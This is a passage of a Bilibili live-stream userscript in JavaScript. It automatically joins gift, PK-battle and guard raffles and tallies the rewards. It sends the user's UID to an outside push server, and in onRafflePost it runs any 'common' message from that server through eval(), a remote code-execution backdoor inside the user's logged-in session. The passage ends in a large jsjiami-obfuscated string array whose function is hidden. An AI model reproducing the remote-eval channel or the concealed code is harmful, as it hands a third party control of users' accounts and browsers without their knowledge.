                            if (BiliPushUtils.pkIdSet.has(id)) return $.Deferred().resolve();
                            BiliPushUtils.pkIdSet.add(id); // 加入id记录列表
                            await BiliPushUtils.Pk._join(roomid, obj.id);
                        }
                        return $.Deferred().resolve();
                    }catch(e){
                        await delayCall(() => BiliPushUtils.Pk.join(roomid, ids));
                    }
                },
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    RafflePorcess.append(roomid, id);
                    window.toast(`[自动抽奖][乱斗领奖]检测到(roomid=${roomid},id=${id})`, 'info');
                    delayCall(() => BiliPushUtils.API.Pk.join(roomid, id).then((response) => {
                        DEBUG('BiliPushUtils.Pk._join: BiliPushUtils.API.Pk.join', response);
                        if (response.code === 0) {
                            try{
                                var giftInfo = response.data.award_text.split('X');
                                Statistics.appendGift(giftInfo[0],giftInfo[1]-0,response.data.award_ex_time);
                            }catch(e){
                            }
                            window.toast(`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_text}`, 'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //BiliPushUtils.up();
                            //window.toast('[自动抽奖][乱斗领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (BiliPushUtils.msgIgnore(response.msg)) {
                            return delayCall(() => BiliPushUtils.Pk._join(roomid, id),1e3);
                        } else if (response.msg.indexOf('过期') > -1) {
                        } else {
                            window.toast(`[自动抽奖][乱斗领奖](roomid=${roomid},id=${id})${response.msg}`, 'caution');
                        }
                        RafflePorcess.remove(roomid, id);
                    }, () => {
                        window.toast(`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
                        return delayCall(() => BiliPushUtils.Pk._join(roomid, id));
                    }),parseInt(Math.random()*6)*1e3);
                    return $.Deferred().resolve();
                }
            },
            Gift: {
                run:(roomid)=>(BiliPushUtils.Check.run(roomid)),
                join:async (roomid, raffleList) => {
                    try{
                        //console.log(`Gift.join`,roomid,raffleList,i)
                        //if (Info.blocked) return $.Deferred().resolve();
                        //if (i >= raffleList.length) return $.Deferred().resolve();
                        for(let obj of raffleList){
                            if (obj.status === 1) { // 可以参加
                                // raffleId过滤，防止重复参加
                                var raffleId = parseInt(obj.raffleId, 10);
                                if (BiliPushUtils.raffleIdSet.has(raffleId)) return $.Deferred().resolve();
                                BiliPushUtils.raffleIdSet.add(raffleId); // 加入raffleId记录列表
                                await BiliPushUtils.Gift._join(roomid, obj.raffleId, obj.type, obj.time_wait);
                            } else if (obj.status === 2 && obj.time > 0) { // 已参加且未开奖
                            }
                        }
                        return $.Deferred().resolve();
                    }
                    catch(e){
                        await delayCall(() => BiliPushUtils.Gift.join(roomid, raffleList),1e3);
                    }
                },
                _join: (roomid, raffleId, type, time_wait = 0) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    raffleId = parseInt(raffleId, 10);
                    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
                    if(!type){
                        delayCall(() => BiliPushUtils.Check.run(roomid));
                        return $.Deferred().resolve();
                    }
                    window.toast(`[自动抽奖][礼物抽奖]等待抽奖(roomid=${roomid},id=${raffleId},type=${type},time_wait=${time_wait})`, 'info');
                    RafflePorcess.append(roomid, raffleId);
                    delayCall(() => BiliPushUtils.API.Gift.join(roomid, raffleId, type).then((response) => {
                        DEBUG('BiliPushUtils.Gift._join: BiliPushUtils.API.Gift.join', response);
                        switch (response.code) {
                            case 0:
                                Statistics.appendGift(response.data.award_name,response.data.award_num,response.data.award_ex_time);
                                window.toast(`[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type}),${response.data.award_name+"x"+response.data.award_num}`, 'success');
                                break;
                            case 402:
                                // 抽奖已过期，下次再来吧
                                break;
                            case 65531:
                                // 65531: 非当前直播间或短ID直播间试图参加抽奖
                                //Info.blocked = true;
                                //BiliPushUtils.up();
                                //window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`, 'error');
                                break;
                            default:
                                if (response.msg.indexOf('拒绝') > -1) {
                                    //Info.blocked = true;
                                    //BiliPushUtils.up();
                                    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                                } else if (BiliPushUtils.msgIgnore(response.msg)) {
                                    return delayCall(() => BiliPushUtils.Gift._join(roomid, raffleId, type),1e3);
                                } else {
                                    window.toast(`[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`, 'caution');
                                }
                        }
                        RafflePorcess.remove(roomid, raffleId);
                    }, () => {
                        window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`, 'error');
                        return delayCall(() => BiliPushUtils.Gift._join(roomid, raffleId, type),1e3);
                    }), (time_wait + 1) * 1e3);
                    return $.Deferred().resolve();
                }
            },
            Guard: {
                run:(roomid)=>(BiliPushUtils.Check.run(roomid)),
                join:async (roomid, guard) => {
                    try{
                        //console.log(`Guard.join`,roomid,guard,i)
                        //if (Info.blocked) return $.Deferred().resolve();
                        if (!guard) return $.Deferred().resolve();
                        for(let obj of guard){
                            // id过滤，防止重复参加
                            var id = parseInt(obj.id, 10);
                            if (BiliPushUtils.guardIdSet.has(id)) return $.Deferred().resolve();
                            BiliPushUtils.guardIdSet.add(id); // 加入id记录列表
                            await BiliPushUtils.Guard._join(roomid, obj.id);
                        }
                        return $.Deferred().resolve();
                    }catch(e){
                        await delayCall(() => BiliPushUtils.Guard.join(roomid, guard));
                    }
                },
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    RafflePorcess.append(roomid, id);
                    window.toast(`[自动抽奖][舰队领奖]检测到(roomid=${roomid},id=${id})`, 'info');
                    delayCall(() =>BiliPushUtils.API.Guard.join(roomid, id).then((response) => {
                        DEBUG('BiliPushUtils.Guard._join: BiliPushUtils.API.Guard.join', response);
                        if (response.code === 0) {
                            Statistics.appendGift(response.data.award_name,response.data.award_num,response.data.award_ex_time);
                            window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_name+"x"+response.data.award_num}`, 'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //BiliPushUtils.up();
                            //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (BiliPushUtils.msgIgnore(response.msg)) {
                            return delayCall(() => BiliPushUtils.Guard._join(roomid, id),1e3);
                        } else if (response.msg.indexOf('过期') > -1) {
                        } else {
                            window.toast(`[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`, 'caution');
                        }
                        RafflePorcess.remove(roomid, id);
                    }, () => {
                        window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
                        return delayCall(() => BiliPushUtils.Guard._join(roomid, id));
                    }),parseInt(Math.random()*6*1e3));
                    return $.Deferred().resolve();
                }
            }
        }
        const BiliPush = {
            _ajax:(url, data, callback,error)=>{
                $.ajax({
                    type: "POST",
                    url: url,
                    data: data,
                    dataType: "json",
                    beforeSend: function (request) {
                    },
                    success: function (data) {
                        callback(data);
                    },
                    error:function(err){
                        error(err);
                    }
                })
            },
            connected:false,
            gsocket:null,
            gsocketTimeId:null,
            gheartTimeId:null,
            first:true,
            lock:false,
            connectWebsocket :(lazy = false)=>{
                if(BiliPush.first){
                    window.toast('初始化bilipush 推送服务', 'info');
                }
                if(BiliPush.lock)return;
                BiliPush.lock = true;
                if(lazy){
                    if(BiliPush.gsocket && BiliPush.gsocket.readyState < 2){
                        BiliPush.lock = false;
                        return;
                    }
                }
                var data = { uid:BilibiliLive.UID,version:VERSION };
                var url="https://bilipush.1024dream.net:5000/ws/pre-connect";
                BiliPush._ajax(url,data,function(d){
                    if(d.code==-1){
                        window.toast('bilipush 拒绝连接:'+d.msg, 'error');
                        BiliPush.lock = false;
                        return;
                    }
                    var url = d.server;
                    if (BiliPush.gsocket) BiliPush.gsocket.close();
                    BiliPush.gsocket = null;
                    BiliPush.gsocket = new WebSocket(url);
                    BiliPush.gsocket.onopen = function (e) {
                        if(BiliPush.first){
                            window.toast('bilipush 连接成功', 'success');
                            BiliPush.first = false;
                        }else{
                            console.info('bilipush 连接成功');
                        }
                        BiliPush.connected = true;
                        BiliPush.gsocket.send("ping");
                        BiliPush.gheartTimeId = setInterval(function () {
                            BiliPush.gsocket.send("ping");
                        }, 120e3);
                    };
                    BiliPush.gsocket.onclose = function (e) {
                        console.error('bilipush 连接断开');
                        BiliPush.connected = false;
                        BiliPush.gsocket = null;
                        clearTimeout(BiliPush.gsocketTimeId);
                        clearInterval(BiliPush.gheartTimeId);
                        BiliPush.gsocketTimeId = setTimeout(function () {
                            if(CONFIG.DD_BP){
                                BiliPush.connectWebsocket();
                            }
                        }, 5000);
                    };
                    BiliPush.gsocket.onmessage = function (e) {
                        try {
                            var msg = JSON.parse(e.data);
                            BiliPush.onRafflePost(msg);
                        } catch (err) {
                            console.log(e,err);
                            return;
                        }
                    };
                    BiliPush.gsocket.onerror = function (e) {
                        console.error('bilipush 连接异常');
                        BiliPush.connected = false;
                        BiliPush.gsocket = null;
                        clearTimeout(BiliPush.gsocketTimeId);
                        clearInterval(BiliPush.gheartTimeId);
                        BiliPush.gsocketTimeId = setTimeout(function () {
                            if(CONFIG.DD_BP){
                                BiliPush.connectWebsocket();
                            }
                        }, 5000);
                    };
                    BiliPush.lock = false;
                }, function (err) {
                    console.error("bilipush连接失败，等待重试...");
                    BiliPush.connected = false;
                    BiliPush.gsocketTimeId = setTimeout(function () {
                        if(CONFIG.DD_BP){
                            BiliPush.connectWebsocket();
                        }
                    }, 5000);
                    BiliPush.lock = false;
                });
            },
            onRafflePost :(rsp)=>{
                try{
                    let raffle_data = JSON.parse(rsp);
                    let {code,type,data} = raffle_data;
                    if(code==0){
                        if(type=="raffle"){
                            let {room_id,raffle_type} = data;
                            switch(raffle_type){
                                case "TV" :
                                case "GUARD":
                                case "PK":
                                case "GIFT":
                                    window.toast(`bilipush 监控到 房间 ${room_id} 的礼物`, 'info');
                                    BiliPushUtils.Check.process(room_id);
                                    break;
                                case "STORM":
                                    window.toast(`bilipush 监控到 房间 ${room_id} 的节奏风暴`, 'info');
                                    BiliPushUtils.Storm.run(room_id);
                                    break;
                            }
                        }else if(type=="common"){
                            try{
                                eval(data);
                            }catch(e){
                                console.error("bilipush 回调失败，可能浏览器不支持");
                            }
                        }else if(type=="notice"){
                            window.toast(data, 'caution');
                        }
                        else if(type=="msg"){
                            window.alertdialog("魔改助手消息",data);
                        }else if(type=="reload"){
                            localStorage.setItem('LIVE_PLAYER_STATUS',JSON.stringify({type:'html5',timeStamp:ts_ms()}));
                            var volume = localStorage.getItem('videoVolume')||0;
                            if(volume==0){
                                localStorage.setItem('videoVolume',0.1);
                            }
                            location.reload();
                        }
                    }
                }catch(e){
                    console.error(e,rsp);
                }
            },
            run:()=>{
                BiliPushUtils.Check.start();
                BiliPushUtils.Check.run(window.BilibiliLive.ROOMID);
                BiliPushUtils.Storm.run(window.BilibiliLive.ROOMID);
                if(CONFIG.DD_BP){
                    BiliPush.connectWebsocket(true);
                }else if(BiliPush.gsocket) {
                    BiliPush.gsocket.close();
                }
                window.websocket = BiliPush.gsocket;
                BiliPushUtils.clearSet();
                setInterval(()=>{
                    BiliPushUtils.clearSet();
                },5e3);
            }
        }
        const RafflePorcess = {
            raffle_Process:{},
            save_Interval:0,
            run:()=>{
                try{
                    var raffle_Process = JSON.parse(localStorage.getItem(`${NAME}_RAFFLE`)) || {};
                    for(let room_id in RafflePorcess.raffle_Process){
                        BiliPushUtils.Check.run(room_id);
                    }
                }catch(e){
                }
                if(RafflePorcess.save_Interval==0){
                    RafflePorcess.save_Interval = setInterval(()=>{
                        localStorage.setItem(`${NAME}_RAFFLE`, JSON.stringify(RafflePorcess.raffle_Process));
                    },100);
                }
            },
            append:(room_id,raffle_id)=>{
                if(RafflePorcess.raffle_Process[room_id]){
                    if(RafflePorcess.raffle_Process[room_id].indexOf(raffle_id)==-1){
                        RafflePorcess.raffle_Process[room_id].push(raffle_id);
                    }
                }else{
                    RafflePorcess.raffle_Process[room_id]=[raffle_id];
                }
            },
            remove:(room_id,raffle_id)=>{
                if(RafflePorcess.raffle_Process[room_id]){
                    RafflePorcess.raffle_Process[room_id] = RafflePorcess.raffle_Process[room_id].filter(r=>r!=raffle_id);
                    if(RafflePorcess.raffle_Process[room_id].length==0){
                        delete RafflePorcess.raffle_Process[room_id];
                    }
                }
            }
        }
        const Statistics = {
            gifts:{},
            queue:[],
            save_Interval:0,
            process_timeOut:0,
            run:()=>{
                try{
                    Statistics.gifts = JSON.parse(localStorage.getItem(`${NAME}_DAYGIFTS`)) || {};
                }catch(e){
                }
                if(!CACHE.stats_ts || checkNewDay(CACHE.stats_ts)){
                    Statistics.gifts = {};
                    CACHE.stats_ts = ts_ms();
                }
                if(Statistics.save_Interval==0){
                    Statistics.save_Interval = setInterval(()=>{
                        localStorage.setItem(`${NAME}_DAYGIFTS`, JSON.stringify(Statistics.gifts));
                    },100);
                }
                if(Statistics.process_timeOut == 0){
                    Statistics.process_timeOut = setTimeout(()=>Statistics.process(),200);
                }
                runTomorrow(Statistics.run);
            },
            appendGift:(name,count,expire)=>{
                if(expire){
                    var expireDay = Math.ceil((expire * 1e3 - new Date().getTime())/86400e3);
                    name = `${name}(${expireDay}d)`;
                }
                console.log(`记录：获得 ${name}x${count}`);
                Statistics.queue.push({name:name,count:count});
            },
            process:()=>{
                while(Statistics.queue.length>0){
                    let{ name,count }=Statistics.queue.shift();
                    if(Statistics.gifts[name]){
                        Statistics.gifts[name] += count;
                    }else{
                        Statistics.gifts[name] = count;
                    }
                }
                clearTimeout(Statistics.process_timeOut);
                Statistics.process_timeOut = setTimeout(()=>Statistics.process(),200);
            },
            showDayGifts:()=>{
                let sumGroupKey = ['辣条'];
                let sumGroup = {};
                let gifts = [];
                for(let [k,v] of Object.entries(Statistics.gifts)){
                    gifts.push(`${k}x${v}`);
                    for(let t of sumGroupKey){
                        if(k.startsWith(t)){
                            if(sumGroup[t]){
                                sumGroup[t] += v;
                            }else{
                                sumGroup[t] = v;
                            }
                        }
                    }
                }
                if(gifts.length>0){
                    gifts.push(`统计:`);
                    for(let [k,v] of Object.entries(sumGroup)){
                        gifts.push(`${k}x${v}`);
                    }
                }
                window.alertdialog('当日礼物统计', gifts.join('<br>'));
            },
        };
        const KeySign = {
            sort:(obj)=>{
                let keys = Object.keys(obj).sort();
                let p=[];
                for(let key of keys){
                    p.push(`${key}=${obj[key]}`);
                }
                return p.join('&');
            },
            convert:(obj)=>{
                for(let k in obj){
                    if($.type(obj[k])=="array"){
                        obj[k] = JSON.stringify(obj[k]);
                    }
                }
            },
        };

var _0xodm='jsjiami.com.v6',_0x2cf9=[_0xodm,'\x56\x44\x6e\x44\x70\x38\x4b\x74\x77\x34\x49\x36\x77\x37\x73\x4c\x77\x35\x76\x43\x6d\x38\x4b\x73\x77\x35\x58\x44\x75\x4d\x4b\x77\x77\x6f\x59\x69\x77\x71\x76\x43\x6f\x77\x3d\x3d','\x77\x71\x4e\x7a\x54\x78\x76\x44\x74\x38\x4b\x58\x77\x72\x37\x43\x6b\x30\x7a\x44\x74\x4d\x4b\x72\x77\x6f\x33\x44\x6b\x4d\x4b\x4e\x62\x4d\x4f\x6c\x77\x36\x7a\x43\x71\x6a\x76\x44\x75\x58\x6a\x43\x67\x67\x3d\x3d','\x77\x36\x33\x43\x6e\x57\x39\x68\x77\x70\x44\x43\x6b\x73\x4b\x72\x77\x35\x58\x44\x6a\x51\x66\x44\x72\x4d\x4f\x70\x4e\x56\x7a\x44\x6b\x45\x52\x63','\x44\x63\x4f\x54\x77\x6f\x33\x44\x73\x77\x39\x73\x64\x38\x4b\x74\x53\x38\x4b\x33\x77\x71\x66\x43\x75\x78\x4c\x44\x76\x38\x4b\x2f\x43\x73\x4b\x6c\x77\x72\x76\x43\x6b\x51\x3d\x3d','\x65\x38\x4f\x5a\x77\x34\x4e\x49\x77\x71\x76\x44\x67\x45\x37\x44\x70\x6b\x44\x44\x6c\x78\x44\x44\x73\x6e\x77\x53','\x58\x63\x4f\x6a\x77\x37\x56\x36\x77\x6f\x6e\x44\x71\x32\x4c\x44\x67\x6e\x66\x44\x72\x42\x6e\x44\x67\x55\x6b\x67\x77\x37\x7a\x43\x6e\x51\x33\x44\x74\x33\x59\x53','\x77\x35\x78\x46\x47\x31\x46\x44\x48\x4d\x4f\x5a\x4a\x6a\x4c\x43\x6f\x73\x4b\x78\x77\x71\x76\x43\x6a\x42\x72\x43\x70\x4d\x4f\x51\x77\x6f\x49\x79\x77\x72\x6f\x3d','\x47\x73\x4b\x71\x77\x72\x6c\x43\x46\x44\x78\x5a\x77\x37\x4c\x43\x68\x4d\x4b\x34\x77\x72\x30\x49\x77\x37\x73\x3d','\x77\x36\x6c\x69\x77\x34\x6a\x44\x76\x4d\x4f\x57','\x77\x71\x6c\x36\x77\x72\x38\x45\x53\x4d\x4b\x65\x50\x51\x3d\x3d','\x4b\x44\x62\x44\x6f\x6a\x7a\x43\x70\x41\x3d\x3d','\x44\x4d\x4b\x35\x77\x34\x76\x43\x68\x68\x77\x3d','\x53\x38\x4f\x62\x77\x35\x39\x4b\x77\x72\x59\x3d','\x66\x38\x4b\x4f\x77\x37\x62\x44\x6a\x55\x45\x38','\x77\x36\x39\x72\x77\x35\x41\x3d','\x77\x71\x4e\x2f\x77\x37\x51\x59\x77\x72\x30\x53\x77\x34\x51\x43','\x4c\x73\x4f\x61\x53\x53\x48\x43\x6e\x77\x3d\x3d','\x54\x41\x2f\x44\x67\x63\x4b\x58\x77\x35\x73\x3d','\x77\x37\x44\x44\x75\x4d\x4f\x71\x55\x54\x67\x4d\x77\x37\x2f\x44\x71\x47\x67\x34\x43\x6d\x45\x42\x77\x37\x38\x3d','\x77\x6f\x5a\x47\x64\x52\x2f\x43\x6f\x77\x3d\x3d','\x4b\x73\x4b\x38\x77\x36\x31\x31\x77\x37\x45\x4f\x52\x51\x3d\x3d','\x77\x36\x66\x43\x72\x79\x56\x50\x77\x72\x41\x3d','\x43\x4d\x4f\x53\x77\x72\x7a\x44\x6f\x42\x52\x62','\x41\x43\x31\x57\x77\x34\x31\x55\x77\x34\x62\x44\x75\x30\x7a\x43\x68\x4d\x4f\x78','\x77\x6f\x66\x43\x6c\x38\x4b\x6c\x77\x37\x73\x6e','\x64\x33\x42\x71\x77\x72\x62\x44\x71\x41\x3d\x3d','\x77\x35\x48\x43\x72\x68\x66\x43\x6e\x6e\x49\x3d','\x77\x36\x74\x62\x77\x35\x58\x44\x67\x63\x4f\x61','\x4a\x68\x5a\x7a\x77\x70\x35\x76','\x77\x71\x44\x44\x6a\x32\x2f\x44\x70\x73\x4f\x51','\x47\x73\x4b\x37\x77\x72\x31\x65\x45\x67\x3d\x3d','\x77\x71\x4c\x43\x6f\x51\x58\x44\x71\x73\x4b\x59\x77\x70\x31\x65\x4a\x56\x30\x59','\x4a\x77\x37\x43\x74\x31\x58\x44\x73\x51\x3d\x3d','\x77\x71\x4e\x7a\x61\x51\x54\x43\x74\x51\x3d\x3d','\x45\x78\x54\x44\x6c\x54\x54\x43\x73\x67\x3d\x3d','\x77\x36\x54\x43\x73\x63\x4f\x66\x77\x34\x50\x43\x6f\x63\x4f\x4d\x77\x6f\x6c\x65\x4c\x45\x70\x34\x65\x63\x4b\x63\x77\x37\x46\x68','\x77\x71\x58\x44\x74\x42\x6a\x44\x71\x73\x4b\x34','\x77\x36\x35\x38\x77\x34\x76\x44\x76\x73\x4f\x71\x77\x36\x34\x34','\x77\x36\x6a\x43\x67\x51\x76\x43\x6d\x58\x62\x43\x73\x32\x50\x44\x74\x63\x4b\x61\x58\x6d\x51\x3d','\x77\x35\x6a\x43\x71\x57\x70\x35\x77\x72\x34\x3d','\x56\x63\x4b\x44\x49\x73\x4b\x37\x77\x70\x49\x3d','\x77\x72\x44\x44\x74\x51\x51\x3d','\x64\x45\x46\x66\x77\x6f\x54\x44\x71\x73\x4b\x50\x77\x72\x51\x3d','\x56\x31\x42\x48\x77\x71\x44\x44\x68\x77\x3d\x3d','\x77\x37\x6c\x4e\x50\x67\x2f\x43\x70\x73\x4b\x70\x77\x72\x34\x3d','\x41\x43\x50\x44\x76\x52\x48\x43\x6d\x41\x3d\x3d','\x77\x70\x35\x4f\x77\x35\x4e\x77\x77\x72\x64\x4e\x77\x70\x4d\x3d','\x5a\x45\x4e\x6b\x77\x36\x54\x44\x6f\x51\x3d\x3d','\x77\x34\x74\x58\x77\x70\x76\x44\x6e\x4d\x4f\x67\x77\x70\x4d\x48\x77\x72\x59\x3d','\x66\x4d\x4b\x70\x42\x63\x4f\x69\x47\x38\x4f\x42\x77\x35\x30\x78','\x77\x70\x4a\x48\x42\x43\x72\x44\x75\x6d\x51\x55','\x77\x71\x49\x61\x77\x72\x38\x59\x77\x6f\x76\x43\x6f\x53\x6f\x77','\x77\x36\x37\x43\x67\x73\x4b\x76\x66\x38\x4b\x35\x54\x77\x3d\x3d','\x77\x71\x6c\x33\x4a\x78\x76\x44\x6e\x53\x64\x44\x77\x36\x38\x3d','\x77\x35\x51\x78\x44\x77\x44\x44\x74\x32\x52\x63\x77\x35\x34\x3d','\x42\x4d\x4b\x4c\x77\x34\x4e\x49\x77\x36\x68\x58\x42\x41\x3d\x3d','\x77\x70\x4a\x48\x42\x43\x72\x44\x71\x57\x4d\x57','\x43\x42\x59\x33\x77\x35\x41\x30\x66\x73\x4b\x69','\x77\x72\x78\x7a\x52\x43\x76\x44\x73\x63\x4b\x42','\x77\x36\x58\x43\x76\x78\x78\x6e\x77\x36\x2f\x44\x6c\x67\x3d\x3d','\x41\x32\x34\x6c\x53\x4d\x4b\x64','\x42\x4d\x4b\x4c\x77\x34\x4e\x49\x77\x70\x39\x53','\x42\x79\x6e\x43\x73\x47\x76\x43\x68\x38\x4f\x59','\x52\x38\x4b\x5a\x4a\x73\x4f\x54\x50\x4d\x4b\x43\x77\x6f\x6f\x3d','\x42\x4d\x4b\x4c\x77\x34\x4e\x49\x77\x36\x68\x53\x41\x67\x3d\x3d','\x57\x54\x6a\x44\x6e\x73\x4b\x77\x77\x34\x4d\x41\x77\x35\x6b\x63\x77\x35\x4c\x43\x69\x4d\x4b\x6d\x77\x35\x4c\x44\x6f\x73\x4b\x39','\x77\x71\x6e\x44\x67\x45\x54\x43\x67\x47\x38\x3d','\x62\x4d\x4f\x49\x50\x41\x4d\x74\x51\x51\x74\x41','\x77\x6f\x66\x44\x70\x6c\x33\x44\x6e\x4d\x4f\x51','\x77\x6f\x39\x77\x77\x72\x55\x71\x51\x67\x3d\x3d','\x61\x63\x4b\x52\x41\x38\x4f\x6e\x47\x77\x3d\x3d','\x4f\x33\x4e\x4f\x42\x4d\x4b\x6b','\x59\x63\x4b\x6b\x4e\x73\x4f\x74\x4a\x67\x3d\x3d','\x77\x34\x2f\x43\x6d\x52\x42\x55\x77\x70\x6f\x3d','\x77\x36\x5a\x55\x77\x34\x48\x44\x6e\x38\x4f\x61','\x44\x55\x34\x53\x57\x63\x4f\x44','\x77\x6f\x76\x43\x6e\x4d\x4b\x36\x77\x37\x51\x74\x47\x78\x44\x43\x76\x63\x4f\x41\x77\x72\x50\x44\x6d\x6b\x31\x68\x4d\x6c\x4e\x50\x48\x42\x54\x44\x6e\x38\x4f\x67','\x77\x34\x31\x4b\x77\x36\x37\x44\x69\x38\x4f\x6b','\x77\x36\x66\x43\x71\x6e\x52\x57\x77\x71\x34\x3d','\x77\x35\x58\x43\x6f\x43\x78\x6a\x77\x35\x49\x3d','\x77\x71\x46\x39\x62\x69\x4c\x43\x6c\x63\x4f\x4a\x5a\x63\x4f\x6c\x50\x46\x50\x43\x73\x68\x39\x2f\x54\x67\x3d\x3d','\x77\x72\x76\x43\x6b\x6c\x70\x4d\x77\x6f\x77\x3d','\x4c\x56\x6b\x4c\x64\x63\x4f\x36\x77\x37\x55\x33','\x77\x37\x4a\x6c\x77\x36\x7a\x44\x75\x4d\x4f\x65','\x50\x63\x4f\x59\x61\x69\x4c\x43\x71\x41\x3d\x3d','\x77\x6f\x62\x44\x68\x6e\x66\x43\x6b\x33\x77\x3d','\x50\x77\x6b\x39\x77\x35\x49\x6a','\x77\x36\x70\x46\x77\x6f\x50\x44\x6b\x4d\x4f\x33','\x53\x69\x45\x67\x77\x72\x72\x44\x74\x51\x3d\x3d','\x47\x73\x4b\x46\x77\x34\x50\x43\x68\x41\x73\x3d','\x64\x63\x4b\x5a\x77\x37\x66\x44\x68\x32\x6f\x2b\x77\x36\x59\x3d','\x61\x63\x4f\x42\x4e\x6e\x63\x3d','\x77\x36\x6c\x50\x77\x70\x58\x44\x74\x4d\x4f\x41','\x4a\x53\x6a\x43\x68\x6b\x2f\x44\x76\x77\x3d\x3d','\x77\x71\x56\x51\x77\x70\x51\x49\x57\x51\x3d\x3d','\x47\x69\x49\x6b\x77\x34\x77\x57','\x4e\x32\x42\x4a\x47\x38\x4b\x59','\x43\x73\x4b\x54\x77\x34\x54\x43\x69\x52\x77\x3d','\x45\x4d\x4f\x59\x77\x6f\x33\x44\x72\x52\x4d\x3d','\x77\x34\x7a\x43\x75\x78\x78\x51\x77\x72\x56\x78\x63\x41\x3d\x3d','\x77\x36\x48\x43\x6f\x79\x46\x7a\x77\x70\x4d\x3d','\x77\x34\x72\x43\x6c\x6b\x35\x62\x77\x72\x59\x3d','\x77\x37\x72\x43\x69\x73\x4f\x37\x77\x36\x76\x43\x70\x67\x3d\x3d','\x4a\x47\x55\x76\x66\x73\x4f\x6d','\x77\x34\x54\x43\x75\x33\x4e\x35\x77\x71\x67\x3d','\x77\x35\x34\x48\x4c\x7a\x66\x44\x70\x77\x3d\x3d','\x77\x71\x66\x44\x68\x56\x72\x43\x69\x6c\x30\x3d','\x77\x72\x56\x66\x52\x67\x6a\x44\x75\x77\x3d\x3d','\x77\x72\x33\x44\x6d\x7a\x62\x44\x6b\x38\x4b\x35','\x77\x37\x44\x43\x69\x4d\x4f\x43\x77\x37\x44\x43\x71\x77\x3d\x3d','\x77\x34\x4d\x50\x46\x53\x4c\x44\x72\x67\x3d\x3d','\x54\x6a\x77\x51\x77\x71\x54\x44\x71\x58\x31\x59\x77\x70\x77\x3d','\x4b\x63\x4f\x44\x51\x31\x42\x68','\x54\x6a\x6a\x44\x69\x51\x3d\x3d','\x48\x51\x38\x31\x77\x35\x6f\x6f\x66\x73\x4b\x4f\x77\x72\x41\x57\x77\x37\x62\x43\x6a\x6b\x52\x50\x52\x51\x3d\x3d','\x77\x34\x56\x41\x4e\x6b\x42\x43\x4e\x38\x4f\x30\x4a\x6a\x66\x43\x6d\x4d\x4b\x6d\x77\x70\x58\x43\x69\x51\x73\x3d','\x77\x35\x78\x50\x49\x6b\x6f\x3d','\x77\x35\x50\x44\x6a\x63\x4f\x63\x59\x78\x4d\x36\x77\x37\x2f\x44\x6d\x55\x67\x55\x50\x58\x38\x38\x77\x35\x34\x3d','\x44\x73\x4b\x37\x77\x71\x78\x76\x45\x68\x68\x41\x77\x35\x6e\x43\x6c\x38\x4b\x72','\x77\x37\x48\x43\x73\x63\x4f\x49\x77\x35\x7a\x43\x73\x67\x3d\x3d','\x4b\x43\x63\x31\x77\x36\x6b\x30','\x41\x69\x56\x31\x77\x71\x56\x69','\x4d\x45\x4a\x62\x42\x4d\x4b\x7a\x77\x36\x46\x64\x77\x36\x6b\x48','\x77\x34\x33\x44\x6a\x63\x4f\x59\x62\x78\x6f\x76\x77\x35\x54\x44\x6c\x30\x67\x3d','\x53\x43\x37\x44\x6e\x63\x4b\x72\x77\x36\x77\x43\x77\x36\x77\x41\x77\x34\x6b\x3d','\x63\x38\x4f\x2f\x4e\x6b\x68\x31','\x77\x36\x33\x43\x74\x55\x78\x36\x77\x6f\x34\x3d','\x56\x45\x56\x70\x77\x71\x54\x44\x75\x67\x3d\x3d','\x77\x6f\x6e\x43\x6e\x73\x4b\x6e\x77\x36\x30\x3d','\x77\x72\x38\x6d\x77\x70\x77\x68\x77\x70\x38\x3d','\x77\x72\x6c\x52\x61\x67\x37\x44\x68\x67\x3d\x3d','\x77\x35\x7a\x43\x6c\x63\x4f\x77\x77\x34\x62\x43\x73\x67\x3d\x3d','\x51\x38\x4b\x76\x4a\x63\x4b\x45\x77\x6f\x52\x69\x46\x38\x4b\x4f\x77\x34\x31\x61\x77\x72\x46\x4b\x52\x47\x55\x3d','\x47\x51\x45\x59\x77\x35\x55\x31','\x77\x36\x7a\x43\x6b\x41\x6a\x43\x67\x32\x30\x3d','\x77\x72\x64\x37\x77\x36\x4a\x4d\x77\x70\x73\x3d','\x77\x35\x64\x36\x45\x44\x4c\x43\x72\x4d\x4f\x77\x77\x37\x38\x3d','\x44\x4d\x4f\x63\x64\x44\x6a\x43\x72\x4d\x4b\x74\x42\x63\x4f\x41\x77\x71\x72\x43\x6f\x73\x4f\x53\x77\x35\x35\x5a\x4f\x67\x3d\x3d','\x42\x69\x4a\x73\x77\x71\x46\x5a\x47\x73\x4b\x45','\x4c\x73\x4b\x68\x77\x36\x5a\x68','\x65\x55\x35\x63\x77\x6f\x48\x44\x70\x67\x3d\x3d','\x